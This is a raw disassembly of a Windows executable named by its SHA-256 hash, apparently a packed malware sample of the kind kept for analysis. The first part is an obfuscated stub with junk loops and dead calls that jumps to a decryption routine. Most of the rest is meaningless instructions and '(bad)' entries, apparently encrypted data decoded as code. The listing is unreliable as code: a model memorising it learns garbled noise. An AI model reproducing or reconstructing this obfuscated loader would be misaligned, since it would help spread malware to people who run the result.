
1954201d05ccdd8dc5992907e026952c61974236810c209c5bc20deec6e6ceb3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a292,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a266,0x13
  401024:	cmp    DWORD PTR ds:0x42a266,0x0
  40102b:	je     0x401065
  401031:	cmp    DWORD PTR ds:0x42a266,0x23
  401038:	ja     0x401065
  40103e:	jmp    0x401053
  401043:	push   0x42a28a
  401048:	push   0x4291e3
  40104d:	call   DWORD PTR ds:0x42a3f2
  401053:	mov    ecx,DWORD PTR ds:0x42a266
  401059:	dec    ecx
  40105a:	mov    DWORD PTR ds:0x42a266,ecx
  401060:	jmp    0x401024
  401065:	push   edi
  401066:	and    DWORD PTR ds:0x42a2b6,0x0
  401070:	mov    esi,DWORD PTR ds:0x42a2b6
  401076:	inc    esi
  401077:	mov    DWORD PTR ds:0x42a2b6,esi
  40107d:	cmp    DWORD PTR ds:0x42a2b6,0x4
  401084:	jg     0x4010ce
  40108a:	jmp    0x4010a5
  40108f:	push   0x5221
  401094:	push   0x42a2ce
  401099:	push   DWORD PTR [ebp-0x10]
  40109c:	push   DWORD PTR [ebp-0x14]
  40109f:	call   DWORD PTR ds:0x42a3f6
  4010a5:	cmp    DWORD PTR ds:0x42a2b6,0x3
  4010ac:	jne    0x4010c1
  4010b2:	xor    esi,esi
  4010b4:	or     esi,DWORD PTR ds:0x42a2b6
  4010ba:	inc    esi
  4010bb:	mov    DWORD PTR ds:0x42a2b6,esi
  4010c1:	cmp    DWORD PTR ds:0x42a2b6,0x15
  4010c8:	jb     0x401070
  4010ce:	mov    esi,0x75108aa
  4010d3:	mov    ecx,DWORD PTR ds:0x42a376
  4010d9:	mov    ecx,DWORD PTR [ecx]
  4010db:	add    DWORD PTR ds:0x42a256,ecx
  4010e1:	xor    eax,esi
  4010e3:	and    DWORD PTR ds:0x42a286,0x0
  4010ed:	mov    ecx,DWORD PTR ds:0x42a286
  4010f3:	inc    ecx
  4010f4:	mov    DWORD PTR ds:0x42a286,ecx
  4010fa:	cmp    DWORD PTR ds:0x42a286,0x1f
  401101:	jge    0x40112c
  401107:	jmp    0x40111f
  40110c:	push   DWORD PTR [ebp-0xc]
  40110f:	push   0x429231
  401114:	push   0x42916d
  401119:	call   DWORD PTR ds:0x42a3b6
  40111f:	cmp    DWORD PTR ds:0x42a286,0x1e
  401126:	jb     0x4010ed
  40112c:	mov    edi,0x3272f1
  401131:	add    eax,edi
  401133:	and    DWORD PTR ds:0x42a292,0x0
  40113d:	jmp    0x401151
  401142:	xor    ecx,ecx
  401144:	xor    ecx,DWORD PTR ds:0x42a292
  40114a:	inc    ecx
  40114b:	mov    DWORD PTR ds:0x42a292,ecx
  401151:	cmp    DWORD PTR ds:0x42a292,0x1e
  401158:	jae    0x40119f
  40115e:	cmp    DWORD PTR ds:0x42a292,0xe
  401165:	ja     0x40119f
  40116b:	jmp    0x40117e
  401170:	push   0x42916d
  401175:	push   DWORD PTR [ebp-0x18]
  401178:	call   DWORD PTR ds:0x42a3ba
  40117e:	cmp    DWORD PTR ds:0x42a292,0xd
  401185:	jne    0x40119a
  40118b:	xor    ecx,ecx
  40118d:	or     ecx,DWORD PTR ds:0x42a292
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a292,ecx
  40119a:	jmp    0x401142
  40119f:	mov    DWORD PTR [ebp-0x40],eax
  4011a2:	mov    eax,ds:0x42a2ca
  4011a7:	sbb    DWORD PTR ds:0x42a25a,eax
  4011ad:	mov    eax,ds:0x42929e
  4011b2:	sub    DWORD PTR ds:0x42a2fa,ecx
  4011b8:	mov    eax,DWORD PTR [eax]
  4011ba:	mov    DWORD PTR [ebp-0x3c],eax
  4011bd:	inc    eax
  4011be:	mov    eax,ds:0x4294ae
  4011c3:	and    DWORD PTR ds:0x42a26a,0x0
  4011cd:	jmp    0x4011df
  4011d2:	mov    ecx,DWORD PTR ds:0x42a26a
  4011d8:	inc    ecx
  4011d9:	mov    DWORD PTR ds:0x42a26a,ecx
  4011df:	cmp    DWORD PTR ds:0x42a26a,0x1f
  4011e6:	jae    0x401233
  4011ec:	cmp    DWORD PTR ds:0x42a26a,0x4
  4011f3:	jge    0x401233
  4011f9:	jmp    0x401214
  4011fe:	push   0x586f
  401203:	push   DWORD PTR [ebp-0x18]
  401206:	push   DWORD PTR [ebp-0x14]
  401209:	push   0x8d08
  40120e:	call   DWORD PTR ds:0x42a3be
  401214:	cmp    DWORD PTR ds:0x42a26a,0x3
  40121b:	jne    0x40122e
  401221:	mov    ecx,DWORD PTR ds:0x42a26a
  401227:	inc    ecx
  401228:	mov    DWORD PTR ds:0x42a26a,ecx
  40122e:	jmp    0x4011d2
  401233:	mov    eax,DWORD PTR [eax]
  401235:	add    ecx,0x507d
  40123b:	mov    DWORD PTR [ebp-0x1c],eax
  40123e:	xor    ecx,0x7815
  401244:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  40124b:	or     DWORD PTR ds:0x42a2da,0x4fa4
  401255:	mov    eax,DWORD PTR [ebp-0x34]
  401258:	xor    eax,esi
  40125a:	sub    ecx,DWORD PTR ds:0x42a2ce
  401260:	add    eax,edi
  401262:	and    DWORD PTR ds:0x42a266,edi
  401268:	mov    DWORD PTR [ebp-0x40],eax
  40126b:	mov    eax,ds:0x42941e
  401270:	jmp    0x403621
  401275:	retf   
  401276:	sbb    al,0x56
  401278:	or     eax,DWORD PTR [esi+0x409c8605]
  40127e:	sub    eax,0xbe0d0c0c
  401283:	out    dx,al
  401284:	mov    ecx,0x83838383
  401289:	out    dx,eax
  40128a:	pop    esi
  40128b:	add    DWORD PTR [ebx+0x38262d24],0x20
  401292:	xor    al,0x22
  401294:	cs je  0x4012d4
  401297:	jo     0x401310
  401299:	push   edx
  40129a:	jo     0x40130f
  40129c:	jae    0x40130a
  40129e:	dec    ebx
  40129f:	aam    0xdd
  4012a1:	clc    
  4012a2:	imul   edx,DWORD PTR [ecx+0x72],0x79a96278
  4012a9:	ins    BYTE PTR es:[edi],dx
  4012aa:	pusha  
  4012ab:	into   
  4012ac:	pop    esp
  4012ad:	push   ebx
  4012ae:	cmp    DWORD PTR [ebp+0x66879603],ecx
  4012b4:	dec    esp
  4012b5:	jle    0x4012fd
  4012b7:	mov    DWORD PTR [edi+0x42bbb97e],esi
  4012bd:	sub    eax,0x3dd77fe
  4012c2:	push   0x7e
  4012c4:	pop    ds
  4012c5:	in     al,dx
  4012c6:	inc    eax
  4012c7:	int3   
  4012c8:	ret    
  4012c9:	in     al,dx
  4012ca:	xchg   esi,eax
  4012cb:	sub    bl,bh
  4012cd:	xchg   edx,eax
  4012ce:	xor    BYTE PTR [esi],cl
  4012d0:	pusha  
  4012d1:	mov    dl,0x93
  4012d3:	aad    0x6
  4012d5:	ins    BYTE PTR es:[edi],dx
  4012d6:	fcom   QWORD PTR ds:0x37030fe5
  4012dc:	and    DWORD PTR [ecx+0xd],edx
  4012df:	aaa    
  4012e0:	jb     0x401353
  4012e2:	shr    BYTE PTR [esi-0x48eba7d6],0xfe
  4012e9:	lock push eax
  4012eb:	xor    al,BYTE PTR [ebp+0x62d14b]
  4012f1:	and    eax,DWORD PTR [ebx]
  4012f3:	cmp    DWORD PTR [eax+0x5ea1dc7a],0x2516b892
  4012fd:	fwait
  4012fe:	dec    eax
  4012ff:	or     bl,BYTE PTR [edi+0x128a8b3d]
  401305:	jecxz  0x401333
  401307:	imul   ecx,DWORD PTR [ebp+eax*2-0x31059ab6],0xffffff93
  40130f:	xor    BYTE PTR [eax-0x6e323937],dl
  401315:	push   0x4d6b54f5
  40131a:	or     eax,0x1a470a3f
  40131f:	lods   al,BYTE PTR ds:[esi]
  401320:	push   edx
  401321:	shl    DWORD PTR [esi+0x6715d949],cl
  401327:	cld    
  401328:	imul   esp,DWORD PTR [edi-0x4c],0x0
  40132c:	jno    0x4012ec
  40132e:	add    DWORD PTR [ebx+0x1c],ebx
  401331:	sbb    BYTE PTR [eax+0x378a6509],ah
  401337:	stc    
  401338:	and    ecx,DWORD PTR [esi]
  40133a:	popf   
  40133b:	jno    0x4012fe
  40133d:	ins    BYTE PTR es:[edi],dx
  40133e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40133f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401340:	icebp  
  401341:	sbb    ah,BYTE PTR [edx+0x4c754d7f]
  401347:	int3   
  401348:	mov    eax,ds:0xd1a5e1e1
  40134d:	mov    WORD PTR [edx+edi*8],?
  401350:	pop    esp
  401351:	test   bl,ah
  401353:	push   ss
  401354:	repz pop esp
  401356:	jl     0x4013c0
  401358:	add    BYTE PTR [ecx-0x665bac53],bl
  40135e:	push   ds
  40135f:	adc    al,0x14
  401361:	mov    esp,0xbd61adc7
  401366:	pop    ebx
  401367:	ret    0xfb7f
  40136a:	dec    ebx
  40136b:	(bad)  
  40136c:	out    0x83,eax
  40136e:	cli    
  40136f:	and    DWORD PTR [ecx+0x456c6eec],ecx
  401375:	in     eax,0x43
  401377:	out    0x81,eax
  401379:	(bad)  
  40137a:	fmul   st(4),st
  40137c:	stc    
  40137d:	jg     0x4013d0
  40137f:	dec    ecx
  401380:	push   esp
  401381:	jbe    0x401366
  401383:	mov    ?,WORD PTR [eax]
  401385:	lods   al,BYTE PTR ds:[esi]
  401386:	jnp    0x40139d
  401388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401389:	ret    
  40138a:	fs (bad) 
  40138c:	in     eax,dx
  40138d:	(bad)  
  40138f:	xor    ebx,esp
  401391:	mov    ?,WORD PTR [ecx-0x5c53e6d9]
  401397:	in     eax,dx
  401398:	cdq    
  401399:	loopne 0x401328
  40139b:	push   ecx
  40139c:	fwait
  40139d:	fwait
  40139e:	outs   dx,BYTE PTR ds:[esi]
  40139f:	xchg   edi,eax
  4013a0:	xchg   BYTE PTR [esp+ecx*2-0x240af1d0],bh
  4013a7:	dec    ecx
  4013a8:	rcl    DWORD PTR [ebx-0x13],0x8a
  4013ac:	jno    0x401405
  4013ae:	out    0xd8,al
  4013b0:	mov    ecx,0x8fb67a34
  4013b5:	test   DWORD PTR [ecx+0x2a],edi
  4013b8:	xchg   esi,eax
  4013b9:	les    eax,FWORD PTR [ebx+0x19]
  4013bc:	call   0x29f94271
  4013c1:	jne    0x401404
  4013c3:	fist   DWORD PTR [edx]
  4013c5:	and    al,0x8a
  4013c7:	pop    eax
  4013c8:	adc    eax,0xb7270ac5
  4013cd:	jno    0x40134f
  4013cf:	fidivr DWORD PTR [edx-0x33294a91]
  4013d5:	xchg   ebx,eax
  4013d6:	pop    ds
  4013d7:	sub    DWORD PTR [edx-0x5f7f29ed],ecx
  4013dd:	sub    ah,bl
  4013df:	jbe    0x4013ef
  4013e1:	add    eax,edx
  4013e3:	sbb    ebp,DWORD PTR [edx-0x43]
  4013e6:	(bad)  
  4013e8:	cli    
  4013e9:	sub    DWORD PTR [eax+0x52],edx
  4013ec:	stos   BYTE PTR es:[edi],al
  4013ed:	mov    ebx,0x336f35d3
  4013f2:	pop    esp
  4013f3:	aas    
  4013f4:	xchg   edi,eax
  4013f5:	cmp    bl,BYTE PTR [eax]
  4013f7:	out    0xda,eax
  4013f9:	outs   dx,DWORD PTR ds:[esi]
  4013fa:	push   esp
  4013fb:	je     0x401448
  4013fd:	pop    ss
  4013fe:	cwde   
  4013ff:	jecxz  0x40146f
  401401:	mov    ?,WORD PTR [esi]
  401403:	mov    BYTE PTR ds:0x8851050a,dl
  401409:	jb     0x4013a9
  40140b:	loop   0x401470
  40140d:	dec    ebx
  40140e:	inc    esp
  40140f:	loope  0x40146f
  401411:	pusha  
  401412:	int3   
  401413:	push   0x80b25175
  401418:	push   edx
  401419:	test   DWORD PTR [edx+0x14d362cb],ecx
  40141f:	push   ebx
  401420:	or     al,0x22
  401422:	or     esi,esp
  401424:	or     bl,dl
  401426:	stos   BYTE PTR es:[edi],al
  401427:	shl    BYTE PTR [eax],0x3b
  40142a:	inc    ecx
  40142b:	or     ch,BYTE PTR [ebp+esi*1-0x70424246]
  401432:	sub    ecx,DWORD PTR [eax+0x3b]
  401435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401436:	mov    edx,0x2361c80b
  40143b:	cdq    
  40143c:	mov    bh,0xe2
  40143e:	and    edx,DWORD PTR [edx-0xfc22df6]
  401444:	fstp   TBYTE PTR [edi]
  401446:	test   eax,0x478a21ea
  40144b:	shl    BYTE PTR [ecx-0x2fb1e62a],cl
  401451:	shl    DWORD PTR [ecx+0x1d],0x54
  401455:	jge    0x4014c9
  401457:	xchg   esi,eax
  401458:	in     eax,0x2b
  40145a:	out    dx,al
  40145b:	dec    ecx
  40145c:	repnz les ebp,FWORD PTR [ecx+0x23]
  401460:	pusha  
  401461:	mov    al,ds:0xdda09ec1
  401466:	in     eax,0x70
  401468:	pop    ss
  401469:	inc    esp
  40146a:	and    al,0x24
  40146c:	js     0x4014a7
  40146e:	pop    ecx
  40146f:	idiv   BYTE PTR [edx]
  401471:	ficom  WORD PTR [eax-0x71bb1fe]
  401477:	test   al,0x55
  401479:	cmp    al,0xd2
  40147b:	data16 ficom DWORD PTR [ebx+eax*4+0x10]
  401480:	inc    esi
  401481:	and    DWORD PTR [esi],ebx
  401483:	shl    dl,1
  401485:	cmp    al,0x14
  401487:	jo     0x4014df
  401489:	std    
  40148a:	jne    0x401434
  40148c:	inc    esp
  40148d:	ret    
  40148e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40148f:	push   edi
  401490:	xlat   BYTE PTR ds:[ebx]
  401491:	rcr    BYTE PTR [edx+0x361bba0b],1
  401497:	cmp    cl,dl
  401499:	arpl   WORD PTR [ecx-0x49],sp
  40149c:	clc    
  40149d:	adc    esp,esi
  40149f:	jnp    0x4014d1
  4014a1:	sub    eax,0x65063e6e
  4014a6:	jno    0x40143a
  4014a8:	in     eax,0x34
  4014aa:	test   al,0x2c
  4014ac:	jb     0x4014e1
  4014ae:	pushf  
  4014af:	ficom  WORD PTR [edx]
  4014b1:	ficom  WORD PTR [ebp+0x57]
  4014b4:	pop    es
  4014b5:	fwait
  4014b6:	ins    DWORD PTR es:[edi],dx
  4014b7:	jmp    0x922f:0x189ba485
  4014be:	out    0xc7,eax
  4014c0:	jmp    0x401509
  4014c2:	in     al,0xf8
  4014c4:	lea    edx,[edx-0x4d073806]
  4014ca:	retf   0x57b4
  4014cd:	icebp  
  4014ce:	loopne 0x4014f2
  4014d0:	and    eax,0xa0b8663d
  4014d5:	icebp  
  4014d6:	enter  0xe34f,0xe9
  4014da:	ds push esi
  4014dc:	mov    ds:0xe16d0ca2,eax
  4014e1:	jo     0x40153d
  4014e3:	mov    gs,ecx
  4014e5:	add    esi,DWORD PTR [esi-0x57170005]
  4014eb:	into   
  4014ec:	scas   eax,DWORD PTR es:[edi]
  4014ed:	or     DWORD PTR [edi-0x339d7ce6],edi
  4014f3:	add    eax,0x48e3afad
  4014f8:	xchg   ebx,eax
  4014f9:	inc    ecx
  4014fa:	cmp    dh,BYTE PTR [ecx]
  4014fc:	stos   DWORD PTR es:[edi],eax
  4014fd:	popa   
  4014fe:	arpl   WORD PTR [ebp-0x515ff5d8],cx
  401504:	or     esp,ebx
  401506:	rcr    BYTE PTR [ecx+0x71f100be],cl
  40150c:	sub    al,0xa4
  40150e:	cwde   
  40150f:	lods   al,BYTE PTR ds:[esi]
  401510:	sbb    edi,ebp
  401512:	stc    
  401513:	dec    eax
  401514:	push   ebx
  401515:	mov    BYTE PTR [ecx],0x2e
  401518:	sub    eax,0xc3463f95
  40151d:	xchg   bh,ah
  40151f:	sbb    cl,BYTE PTR [edi-0x2cd3421f]
  401525:	cmp    DWORD PTR [esi-0x6c],edi
  401528:	not    BYTE PTR [eax]
  40152a:	mov    ds:0xe7506168,eax
  40152f:	and    BYTE PTR [esp+esi*2+0x4e],0xb8
  401534:	sbb    al,0xfa
  401536:	xchg   edx,eax
  401537:	out    0xee,al
  401539:	add    al,BYTE PTR [edi+edi*8]
  40153c:	cmc    
  40153d:	or     BYTE PTR [esi-0x29b6b6c6],0xe6
  401544:	bound  edx,QWORD PTR [ecx-0x21db964a]
  40154a:	pop    ebx
  40154b:	mov    ebx,0x7124d544
  401550:	mov    ds:0xafc495a2,al
  401555:	test   ebp,esi
  401557:	not    DWORD PTR ds:0xb282f129
  40155d:	cmp    ecx,ecx
  40155f:	pusha  
  401560:	cld    
  401561:	adc    eax,0x12005f31
  401566:	sbb    ebx,esp
  401568:	scas   al,BYTE PTR es:[edi]
  401569:	(bad)  
  40156a:	in     al,0x19
  40156c:	pop    es
  40156d:	or     ecx,DWORD PTR [edx-0x2e5b678c]
  401573:	stos   DWORD PTR es:[edi],eax
  401574:	fnstsw WORD PTR [esi+0x5662f448]
  40157a:	xor    ch,BYTE PTR ds:0x4203a10c
  401580:	push   ss
  401581:	or     cl,BYTE PTR [eax-0x3064962c]
  401587:	dec    esp
  401588:	in     eax,dx
  401589:	mov    eax,ds:0xda2ec354
  40158e:	lods   al,BYTE PTR ds:[esi]
  40158f:	scas   al,BYTE PTR es:[edi]
  401590:	and    bl,dh
  401592:	and    DWORD PTR [edi],edi
  401594:	push   ds
  401595:	sub    al,0x45
  401597:	xor    al,0x7f
  401599:	and    DWORD PTR [ebx],esp
  40159b:	fwait
  40159c:	and    al,BYTE PTR [ebx-0x1d]
  40159f:	dec    ebx
  4015a0:	cmc    
  4015a1:	or     BYTE PTR [edx],dl
  4015a3:	and    eax,0x3c1bce90
  4015a8:	fidivr DWORD PTR [ecx-0x4e27eed4]
  4015ae:	cmc    
  4015af:	push   esi
  4015b0:	cld    
  4015b1:	push   0x3f
  4015b3:	arpl   WORD PTR [edx-0x10],sp
  4015b6:	push   0xb87940b3
  4015bb:	sbb    eax,0xbd5bcc7d
  4015c0:	push   ecx
  4015c1:	out    dx,eax
  4015c2:	fidivr WORD PTR [edx-0x29]
  4015c5:	jmp    0x401573
  4015c7:	mov    WORD PTR [edx+0x4a5c7bf3],es
  4015cd:	mov    ebx,0xc543c88d
  4015d2:	sar    DWORD PTR [ebp-0x1e41494a],cl
  4015d8:	sub    DWORD PTR [ecx-0x7e],esp
  4015db:	push   ss
  4015dc:	and    edi,ebp
  4015de:	imul   ebp,DWORD PTR [ebx-0x6dae8282],0xfffffff8
  4015e5:	(bad)  
  4015e6:	rcl    eax,cl
  4015e8:	aas    
  4015e9:	xchg   BYTE PTR [eax+eiz*2],cl
  4015ec:	shr    BYTE PTR [edi+0x7f36721b],0xfe
  4015f3:	clc    
  4015f4:	or     al,BYTE PTR [eax+0x629bea]
  4015fa:	leave  
  4015fb:	jno    0x401620
  4015fd:	add    dl,ah
  4015ff:	sbb    al,0xdb
  401601:	aaa    
  401602:	pop    edx
  401603:	and    ch,BYTE PTR [edi]
  401605:	cmp    BYTE PTR [eax],bl
  401607:	inc    ecx
  401608:	push   0x4f
  40160a:	sbb    al,0x34
  40160c:	in     al,0x69
  40160e:	dec    esi
  40160f:	push   edi
  401610:	scas   eax,DWORD PTR es:[edi]
  401611:	(bad)  
  401612:	xor    ah,BYTE PTR [eax*4-0x5dda01c1]
  401619:	mov    esi,0xe5c052fb
  40161e:	mov    edi,0xfeaaf995
  401623:	mov    ch,0x71
  401625:	scas   eax,DWORD PTR es:[edi]
  401626:	hlt    
  401627:	call   0x812a:0x8b97103b
  40162e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40162f:	adc    BYTE PTR [esi-0x44abfc0b],0x4d
  401636:	test   eax,0x1ffe2ccb
  40163b:	jmp    0xd86992d3
  401640:	sti    
  401641:	pop    ebp
  401642:	scas   eax,DWORD PTR es:[edi]
  401643:	pusha  
  401644:	je     0x4015e8
  401646:	int3   
  401647:	mov    ah,0x81
  401649:	das    
  40164a:	or     BYTE PTR [esi+0x7d],ch
  40164d:	mov    esi,0xc1c37cbe
  401652:	lahf   
  401653:	jecxz  0x401606
  401655:	lea    esi,[ebx+0x78758c5f]
  40165b:	dec    eax
  40165c:	or     BYTE PTR [esi],dl
  40165e:	jp     0x401611
  401660:	fnstsw WORD PTR [esi+edx*8]
  401663:	test   al,0x32
  401665:	jae    0x40167c
  401667:	stc    
  401668:	inc    ebx
  401669:	push   ecx
  40166a:	xor    eax,0x98adec3a
  40166f:	fwait
  401670:	cmp    al,0x2e
  401672:	(bad)  [bp+di+0x62a8]
  401677:	fidiv  DWORD PTR [eax-0x2]
  40167a:	sub    al,0xb1
  40167c:	xlat   BYTE PTR ds:[ebx]
  40167d:	add    BYTE PTR [esp+eax*1+0x1b3cf8ec],dl
  401684:	stc    
  401685:	add    al,0x1e
  401687:	fild   WORD PTR [ecx+0x5c]
  40168a:	mov    ah,0xb4
  40168c:	add    cl,BYTE PTR [esi+0x2f7fbbaf]
  401692:	xchg   edx,eax
  401693:	int    0xae
  401695:	dec    DWORD PTR [ebx-0x32]
  401698:	jb     0x4016a2
  40169a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40169b:	inc    esp
  40169c:	(bad)  [ecx+0x2c8e11ad]
  4016a2:	adc    ah,BYTE PTR [ecx+ebp*2-0x53]
  4016a6:	adc    al,0xb7
  4016a8:	push   esp
  4016a9:	je     0x401685
  4016ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ac:	xchg   ebp,eax
  4016ad:	rcl    BYTE PTR [esi+0x3566b227],1
  4016b3:	fdiv   QWORD PTR es:[ebp-0x48ddedc4]
  4016ba:	out    dx,eax
  4016bb:	into   
  4016bc:	mov    eax,ds:0x14e3a66f
  4016c1:	loopne 0x401685
  4016c3:	dec    esi
  4016c4:	lds    ebx,FWORD PTR [esi+0x474a3499]
  4016ca:	pop    ds
  4016cb:	enter  0x4fc4,0x21
  4016cf:	jecxz  0x401674
  4016d1:	popa   
  4016d2:	push   ebx
  4016d3:	cmp    al,dl
  4016d5:	pop    ebp
  4016d6:	or     al,0x9c
  4016d8:	push   es
  4016d9:	pop    ss
  4016da:	fild   DWORD PTR [ecx]
  4016dc:	dec    esi
  4016dd:	sbb    al,0x3a
  4016df:	mov    ecx,0x798a720f
  4016e4:	push   esi
  4016e5:	bsf    ebp,DWORD PTR [edx]
  4016e8:	jmp    0x1a05:0xb7176a77
  4016ef:	loopne 0x40175b
  4016f1:	mov    ds,WORD PTR [ebx+eiz*1]
  4016f4:	add    DWORD PTR [ebp-0x2a],esp
  4016f7:	push   esp
  4016f8:	call   0x50c58afe
  4016fd:	fld    TBYTE PTR [edx+ecx*4+0x32]
  401701:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  401703:	test   al,0x8d
  401705:	jns    0x4016db
  401707:	xchg   edi,eax
  401708:	repz jbe 0x401724
  40170b:	outs   dx,DWORD PTR ds:[esi]
  40170c:	jbe    0x401705
  40170e:	ds sahf 
  401710:	mov    al,es:0xcdbc5e
  401716:	lea    eax,[eax+0x89f8e80]
  40171c:	out    dx,al
  40171d:	lds    eax,FWORD PTR [eax]
  40171f:	mul    DWORD PTR [esi+eiz*8+0x6]
  401723:	fstp   DWORD PTR [eax+0x5c5b165f]
  401729:	push   0xfffffff8
  40172b:	outs   dx,BYTE PTR ds:[esi]
  40172c:	nop
  40172d:	out    0xd6,eax
  40172f:	mov    ebp,0x868eda46
  401734:	sbb    al,0x38
  401736:	or     BYTE PTR [ebp-0x1ffe91e2],0xf2
  40173d:	mov    cl,0x73
  40173f:	(bad)  
  401741:	mov    BYTE PTR gs:[ecx+0x3a],0x5e
  401746:	daa    
  401747:	push   eax
  401748:	daa    
  401749:	push   edx
  40174a:	jno    0x4016f5
  40174c:	jecxz  0x40175b
  40174e:	dec    edx
  40174f:	jmp    FWORD PTR [esi]
  401751:	js     0x4017b2
  401753:	bound  edx,QWORD PTR [ebp-0x32]
  401756:	sub    ax,0x4b82
  40175a:	dec    esi
  40175b:	or     eax,0x89b7240f
  401760:	sbb    ebp,DWORD PTR [edx+0x4c]
  401763:	adc    DWORD PTR [edi+0x50],ebx
  401766:	xor    al,0xe1
  401768:	pop    es
  401769:	ss cdq 
  40176b:	sbb    al,0x8c
  40176d:	jnp    0x40172b
  40176f:	sub    DWORD PTR [esi],ecx
  401771:	push   ds
  401772:	ds dec ebp
  401774:	push   es
  401775:	push   0xffffffe5
  401777:	mov    eax,ds:0xb2571b63
  40177c:	dec    ecx
  40177d:	push   ebx
  40177e:	scas   eax,DWORD PTR es:[edi]
  40177f:	and    al,cl
  401781:	mov    ds:0xc619861a,eax
  401786:	imul   esp,DWORD PTR [ebx-0x68],0x7f
  40178a:	inc    DWORD PTR [eax-0x3df0d82f]
  401790:	jp     0x40176e
  401792:	jle    0x40172a
  401794:	or     eax,0x2cb5452b
  401799:	adc    DWORD PTR ds:[ebx-0x6729486f],esi
  4017a0:	fdivrp st(7),st
  4017a2:	data16 test al,0xc8
  4017a5:	jl     0x401808
  4017a7:	inc    esi
  4017a8:	aam    0xa2
  4017aa:	mov    eax,ds:0xf7ee1f94
  4017af:	popa   
  4017b0:	rcl    BYTE PTR [ebp+0x586450a4],cl
  4017b6:	stos   BYTE PTR es:[edi],al
  4017b7:	push   esp
  4017b8:	mov    ah,0xae
  4017ba:	jmp    0x1045d015
  4017bf:	retf   
  4017c0:	stc    
  4017c1:	mov    ah,BYTE PTR [ebp-0x31816752]
  4017c7:	scas   al,BYTE PTR es:[edi]
  4017c8:	ss push ss
  4017ca:	pop    ds
  4017cb:	pusha  
  4017cc:	jmp    0xd358:0x609e11f6
  4017d3:	icebp  
  4017d4:	xchg   edi,eax
  4017d5:	das    
  4017d6:	scas   eax,DWORD PTR es:[edi]
  4017d7:	pop    es
  4017d8:	call   0xd859999b
  4017dd:	add    eax,0xd5eda732
  4017e2:	jns    0x4017d7
  4017e4:	mov    ds:0x18ef0d78,al
  4017e9:	mov    esp,0xd5b55888
  4017ee:	imul   ebx,esp,0xa329a70b
  4017f4:	add    eax,0x82010c89
  4017f9:	xchg   esp,eax
  4017fa:	and    edi,DWORD PTR [edi]
  4017fc:	jbe    0x40184b
  4017fe:	loopne 0x40180c
  401800:	mov    esp,0xc4c9683d
  401805:	xchg   DWORD PTR [esi],ebx
  401807:	scas   al,BYTE PTR es:[edi]
  401808:	mov    ecx,0xdb3d6147
  40180d:	adc    al,0x2e
  40180f:	push   edx
  401810:	in     eax,0x2d
  401812:	mov    cl,0xff
  401814:	fwait
  401815:	or     al,0x4a
  401817:	mov    eax,ds:0x9402bd25
  40181c:	les    edi,FWORD PTR [esi+0x25]
  40181f:	xor    ebx,DWORD PTR [ebp-0x38e6518c]
  401825:	jp     0x401839
  401827:	pop    esp
  401828:	jnp    0x401811
  40182a:	dec    ecx
  40182b:	jle    0x401832
  40182d:	hlt    
  40182e:	xchg   edi,eax
  40182f:	cdq    
  401830:	mov    ds:0x85901566,al
  401835:	mov    DWORD PTR gs:[ecx-0x76e2ca68],ebp
  40183c:	xor    bh,dh
  40183e:	mov    cl,0xc4
  401840:	mul    DWORD PTR [edi+0x4b]
  401843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401844:	sub    al,0xa
  401846:	stos   BYTE PTR es:[edi],al
  401847:	sub    DWORD PTR [edi-0x6a],0xecf7c975
  40184e:	mov    eax,0x581613d2
  401853:	and    eax,0x2c3b5090
  401858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401859:	jp     0x4018c7
  40185b:	ja     0x401811
  40185d:	imul   ecx,DWORD PTR gs:[esi+0x75],0x84e8ab91
  401865:	fidiv  WORD PTR [esi-0x7e8ec5a6]
  40186b:	into   
  40186c:	shl    BYTE PTR [ecx+0x130a5469],0xac
  401873:	scas   eax,DWORD PTR es:[edi]
  401874:	xchg   ebp,eax
  401875:	mov    dh,BYTE PTR [esi]
  401877:	or     dl,BYTE PTR [ebx-0x41]
  40187a:	sub    edx,ebx
  40187c:	pop    edx
  40187d:	scas   al,BYTE PTR es:[edi]
  40187e:	ror    DWORD PTR [esi+0x4ca49e3],cl
  401884:	jl     0x4018d9
  401886:	jg     0x40183b
  401888:	gs test al,0xcc
  40188b:	aam    0x7d
  40188d:	(bad)  
  40188e:	es jge 0x401894
  401891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401892:	inc    bp
  401894:	or     al,0x75
  401896:	ds mov ah,0xdd
  401899:	xor    ecx,DWORD PTR [ecx]
  40189b:	sub    ch,dl
  40189d:	std    
  40189e:	adc    eax,0x3fcc4a76
  4018a3:	mov    gs,WORD PTR [ecx]
  4018a5:	data16 outs dx,BYTE PTR ds:[esi]
  4018a7:	or     DWORD PTR [ecx-0x1c9d09a4],eax
  4018ad:	ret    0x43ca
  4018b0:	adc    al,0x23
  4018b2:	idiv   ebx
  4018b4:	inc    eax
  4018b5:	mul    eax
  4018b7:	je     0x40186e
  4018b9:	push   esi
  4018ba:	push   esp
  4018bb:	xchg   esp,ecx
  4018bd:	sti    
  4018be:	in     al,dx
  4018bf:	xchg   edi,eax
  4018c0:	aaa    
  4018c1:	and    DWORD PTR [edx-0x1130323d],eax
  4018c7:	adc    ebp,DWORD PTR [edx-0x1e]
  4018ca:	(bad)  
  4018cb:	(bad)  
  4018cc:	iret   
  4018cd:	aas    
  4018ce:	(bad)  
  4018cf:	iret   
  4018d0:	push   esi
  4018d1:	shl    DWORD PTR [edi+0x1b58874a],0x80
  4018d8:	outs   dx,DWORD PTR ds:[esi]
  4018d9:	imul   bh
